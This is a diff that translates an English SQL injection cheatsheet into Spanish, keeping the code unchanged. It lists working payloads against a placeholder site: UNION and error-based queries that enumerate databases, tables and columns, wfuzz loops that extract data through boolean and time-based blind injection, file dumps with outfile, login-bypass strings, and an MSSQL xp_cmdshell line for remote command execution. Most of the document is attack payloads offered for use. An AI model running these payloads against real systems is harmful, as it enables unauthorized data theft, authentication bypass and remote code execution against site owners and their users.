@@ -1,203 +1,203 @@
-#### SQL Injection Cheatsheet
-This cheatsheet should NOT be considered as reference but a guide to built on. Some of the examples below will require modification(s) 
-such as url encode, comments, etc. Before we continue, here is a couple good to know SQL functions.
+#### Hoja de Referencia (Cheatsheet) de Inyección SQL
+Esta hoja de referencia NO debe considerarse una referencia definitiva, sino una guía sobre la cual construir. Algunos de los ejemplos a continuación requerirán modificaciones, 
+tales como codificación URL (url encode), comentarios, etc. Antes de continuar, aquí hay un par de funciones SQL útiles que conviene conocer.
 
 ```php
-limit <row offset>,<number of rows>                          # display rows based on offset and number  
+limit <desplazamiento de fila>,<número de filas>             # mostrar filas según el desplazamiento (offset) y cantidad  
 
-count(*)                                                     # display number of rows  
+count(*)                                                     # mostrar el número de filas  
 
-rand()                                                       # generate random number between 0 and 1 
+rand()                                                       # generar un número aleatorio entre 0 y 1 
 
-floor(rand()*<number>)                                       # print out number part of random decimal number 
+floor(rand()*<número>)                                       # imprimir la parte entera de un número decimal aleatorio 
 
-select(select database());                                   # double query (nested) using database() as an example 
+select(select database());                                   # consulta doble (anidada) usando database() como ejemplo 
 
-group by <column name>                                       # summarize rows based on column name  
+group by <nombre de columna>                                 # agrupar/resumir filas según el nombre de la columna  
 
-concat(<string1>, <string2>, ..)                             # concatenate strings such as tables, column names  
+concat(<cadena1>, <cadena2>, ..)                             # concatenar cadenas como nombres de tablas o columnas  
 
-length(<string>)                                             # calculate the number of characters for given string 
+length(<cadena>)                                             # calcular el número de caracteres de una cadena dada 
 
-substr(<string>,<offset>,<characters length>)                # print string character(s) by providing offset and length 
+substr(<cadena>,<desplazamiento>,<longitud de caracteres>)   # imprimir caracteres de una cadena indicando desplazamiento y longitud 
 
-ascii(<character>)                                           # decimal representation of the character 
+ascii(<carácter>)                                            # representación decimal del carácter 
 
-sleep(<number of seconds>)                                   # go to sleep for <number of seconds>
+sleep(<número de segundos>)                                  # pausar la ejecución durante <número de segundos>
 
-if(<condition>,<true action>,<false action>)                 # conditional if statement 
+if(<condición>,<acción verdadera>,<acción falsa>)            # sentencia condicional if 
 
-like "<string>%"                                             # checks if provided string present
+like "<cadena>%"                                             # comprueba si la cadena proporcionada está presente
 
-outfile "<url to file>"                                      # dump output of select statement into a file
+outfile "<ruta al archivo>"                                  # volcar el resultado de la sentencia select en un archivo
 
-load_file("<url to file>")                                   # dump the content of file
+load_file("<ruta al archivo>")                               # volcar el contenido de un archivo
 ```
-Now comes the fun part, here's combination of error, union, and blind SQL command injection examples.
+Ahora viene la parte divertida: aquí tienes una combinación de ejemplos de inyección de comandos SQL basados en errores, basados en UNION y a ciegas (blind).
 
-Determine back-end query number of columns with error-based string SQL command injection
+Determinar el número de columnas de la consulta en el back-end con inyección SQL de cadena basada en errores:
 ```php
 http://meh.com/index.php?id=1 order by <number>
 ```
 
-Determine back-end query number of columns by observing `http response size` with `wfuzz` in error-based integer SQL command injection
+Determinar el número de columnas de la consulta en el back-end observando el `tamaño de respuesta http` con `wfuzz` en una inyección SQL de enteros basada en errores:
 ```php
 wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
 ```
 
-Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This 
-injection depends on number of columns identified by `order by` clause
+Identificar las columnas imprimibles en la página web mediante UNION proporcionando un valor falso a la consulta del back-end con inyección SQL de enteros basada en errores. Esta 
+inyección depende del número de columnas identificadas por la cláusula `order by`:
 ```php
 http://meh.com/index.php?id=-1 union select <number of columns separated by comma>
 ```
 
-Dump the content of table into the filesystem
+Volcar el contenido de la tabla en el sistema de archivos:
 ```php
 http://meh.com/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
 ```
 
-Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets displayed on the webpage
+Imprimir la versión de SQL del back-end con inyección SQL de enteros basada en errores, asumiendo que el contenido de la columna 3 se muestra en la página web:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
 ```
 
-Print user running the query to access back-end database server with error-based integer SQL command injection
+Imprimir el usuario que ejecuta la consulta para acceder al servidor de base de datos back-end con inyección SQL de enteros basada en errores:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
 ```
 
-Print database name with error-based integer SQL command injection
+Imprimir el nombre de la base de datos con inyección SQL de enteros basada en errores:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
 ```
 
-Print database directory with error-based integer SQL command injection
+Imprimir el directorio de la base de datos con inyección SQL de enteros basada en errores:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
 ```
 
-Print table names with error-based integer SQL command injection
+Imprimir los nombres de las tablas con inyección SQL de enteros basada en errores:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
 ```
 
-Print column names with error-based integer SQL command injection
+Imprimir los nombres de las columnas con inyección SQL de enteros basada en errores:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
 ```
 
-Print content of column with error-based integer SQL command injection 
+Imprimir el contenido de una columna con inyección SQL de enteros basada en errores:
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
 ```
 
-Use `and` statement as substitute to regular comments such as `--+`, `#`, and `/* */` with error-based string SQL command injection
+Usar la sentencia `and` como sustituto de comentarios regulares tales como `--+`, `#` y `/* */` con inyección SQL de cadena basada en errores:
 ```php
 http://meh.com/index.php?id=1' <sqli here> and '1
 ```
-Determine database name with boolean-based blind SQL injection with `substr()`
+Determinar el nombre de la base de datos con inyección SQL a ciegas basada en booleanos (boolean-based blind) usando `substr()`:
 ```php
 http://meh.com/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
 ```
 
-Determine database name with boolean-based blind SQL injection by observing `http response size` with combination of `substr()` and `wfuzz`, 
-assuming database name does not include special characters
+Determinar el nombre de la base de datos con inyección SQL a ciegas basada en booleanos observando el `tamaño de respuesta http` con una combinación de `substr()` y `wfuzz`, 
+asumiendo que el nombre de la base de datos no incluye caracteres especiales:
 ```php
 for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://meh.com/index.php?id=1' 
 and (substr(database(),$i,1))='FUZZ' --+";done 
 ```
-Determine databsae name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()` and `wfuzz`. The 
-below range is the standard ASCII characters (32-127) 
+Determinar el nombre de la base de datos con inyección SQL a ciegas basada en booleanos observando el `tamaño de respuesta http` con `substr()`, `ascii()` y `wfuzz`. El 
+siguiente rango corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done 
 ```
 
-Determine table name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`.The below range 
-is the standard ASCII characters (32-127) 
+Determinar el nombre de la tabla con inyección SQL a ciegas basada en booleanos observando el `tamaño de respuesta http` con `substr()`, `ascii()` y `wfuzz`. El siguiente rango 
+corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select table_name from 
-information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next 
-available table name 
+information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # incrementa el primer argumento de limit en 1 para obtener el siguiente 
+nombre de tabla disponible 
 ```
 
-Determine column name with boolean blind-based SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`. The below range 
-is the standard ASCII characters (32-127) 
+Determinar el nombre de la columna con inyección SQL a ciegas basada en booleanos observando el `tamaño de respuesta http` con `substr()`, `ascii()` y `wfuzz`. El siguiente rango 
+corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select column_name from 
-information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available 
-column name 
+information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # incrementa el primer argumento de limit en 1 para obtener el siguiente 
+nombre de columna disponible 
 ```
-Boolean-based blind SQL command injection demo
+Demostración de inyección de comandos SQL a ciegas basada en booleanos:
 
 ![alt text](https://j.gifs.com/W77p8o.gif)
 
-Confirm time-based blind SQL injection using `sleep()` function
+Confirmar inyección SQL a ciegas basada en tiempo (time-based blind) usando la función `sleep()`:
 ```php
 http://meh.com/index.php?id=1' and sleep(10) --+
 ```
 
-Determine database version with time-based blind SQL injection using `sleep()`, `like""`, and conditional `if`, assuming the back-end database is 
-running version 5
+Determinar la versión de la base de datos con inyección SQL a ciegas basada en tiempo usando `sleep()`, `like""` y el condicional `if`, asumiendo que la base de datos back-end 
+ejecuta la versión 5:
 ```php
 http://meh.com/index.php?id=1' and if((select version()) like "5%", sleep(10), null) --+
 ```
 
-Determine database name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, and `wfuzz`.The below range is 
-the standard ASCII characters (32-127)
+Determinar el nombre de la base de datos con inyección SQL a ciegas basada en tiempo observando el `tiempo de respuesta http` con `substr()`, `ascii()` y `wfuzz`. El siguiente rango 
+corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt>
 ```
 
-Determine table name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the 
-standard ASCII characters (32-127)
+Determinar el nombre de la tabla con inyección SQL a ciegas basada en tiempo observando el `tiempo de respuesta http` con `substr()`, `ascii()`, `if` y `wfuzz`. El siguiente rango 
+corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables 
-where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to 
-get the next available table name 
+where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # incrementa el primer argumento de limit en 1 para 
+obtener el siguiente nombre de tabla disponible 
 ```
-Determine column name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the 
-standard ASCII characters (32-127)
+Determinar el nombre de la columna con inyección SQL a ciegas basada en tiempo observando el `tiempo de respuesta http` con `substr()`, `ascii()`, `if` y `wfuzz`. El siguiente rango 
+corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(column_name,$i,1))from information_schema.columns
- where table_name='<table name>' limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to 
-get the next available column name 
+ where table_name='<table name>' limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # incrementa el primer argumento de limit en 1 para 
+obtener el siguiente nombre de columna disponible 
 ```
 
-Extract column content with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the 
-standard ASCII characters (32-127)
+Extraer el contenido de la columna con inyección SQL a ciegas basada en tiempo observando el `tiempo de respuesta http` con `substr()`, `ascii()`, `if` y `wfuzz`. El siguiente rango 
+corresponde a los caracteres ASCII estándar (32-127):
 ```php
 for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "http://meh.com/index.php?id=1' and if(ascii(substr((select <column name> from <table name> 
-limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # change <column name> to get the content of next column
+limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # cambia <column name> para obtener el contenido de la siguiente columna
 ```
-Time-based blind SQL command injection with bash magic demo
+Demostración de inyección de comandos SQL a ciegas basada en tiempo con magia de bash:
 
 ![alt text](https://j.gifs.com/2vv2J1.gif)
 
-Hope those were helpful! Now here's couple login bypass commands that worked for me
+¡Espero que hayan sido de ayuda! Ahora aquí tienes un par de comandos para evadir inicios de sesión (login bypass) que me funcionaron:
 ```php
 meh' OR 3=3;#
 meh' OR 2=2 LIMIT 1;#
 meh' OR 'a'='a
 meh' OR 1=1 --+
 ```
-Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
+A veces te encontrarás con un servidor Microsoft SQL que tiene `xp_cmdshell` activado; aquí tienes la sintaxis para ejecución remota de código:
 ```php
 meh' exec master..xp_cmdshell '<command here>' --
 ```
 
-Final notes!
-- If you made it this far then you know that most of the SQL command injection examples are based on `MySQL` and I don't plan on making any for `MSSQL` cause I'm lazy
-- Use your proxy of choice to bypass client-side javascript restrictions
-- `order by` clause works only with regular comments such as `--+`
-- Update ASCII range to include special characters if you're going after users table
-- `MySQL` don't have permissions to overwrite an existing file, make sure you go with new filename every single time with `outfile`.
-- Make sure the vulnerable parameter have false value when working with union-based SQL command injection
-- It's worth noting that all of the examples in this cheatsheet where http `GET` requests, and it shouldn't be that hard to replicate them with http `POST`requests once you grasp the core concepts.
-- You need to input true value to the vulnerable parameter for `and sleep()` to work, otherwise go with `or sleep()`. Here's an example for the sake of clarification
+¡Notas finales!
+- Si llegaste hasta aquí, ya sabes que la mayoría de los ejemplos de inyección de comandos SQL están basados en `MySQL` y no planeo hacer ninguno para `MSSQL` porque me da pereza.
+- Usa tu proxy preferido para evadir las restricciones de JavaScript del lado del cliente.
+- La cláusula `order by` solo funciona con comentarios regulares como `--+`.
+- Actualiza el rango ASCII para incluir caracteres especiales si vas tras la tabla de usuarios (`users`).
+- `MySQL` no tiene permisos para sobrescribir un archivo existente; asegúrate de usar un nombre de archivo nuevo cada vez que uses `outfile`.
+- Asegúrate de que el parámetro vulnerable tenga un valor falso cuando trabajes con inyección SQL basada en UNION.
+- Cabe señalar que todos los ejemplos en esta hoja de referencia fueron peticiones HTTP `GET`, y no debería ser tan difícil replicarlos con peticiones HTTP `POST` una vez que comprendas los conceptos básicos.
+- Necesitas introducir un valor verdadero en el parámetro vulnerable para que `and sleep()` funcione; de lo contrario, usa `or sleep()`. Aquí tienes un ejemplo para mayor claridad:
 ```php
 http://meh.com/index.php?id=<true value>' and sleep(1) #
 http://meh.com/index.php?id=<false value>' or sleep(1) #
 ```
-To do list
-- Python or bash script to convert ascii to text after data extraction (grep output in this case)
-- Create outfile && loadfile templates
+Lista de tareas pendientes (To do list):
+- Script en Python o bash para convertir ASCII a texto después de la extracción de datos (salida de grep en este caso)
+- Crear plantillas para `outfile` y `loadfile`
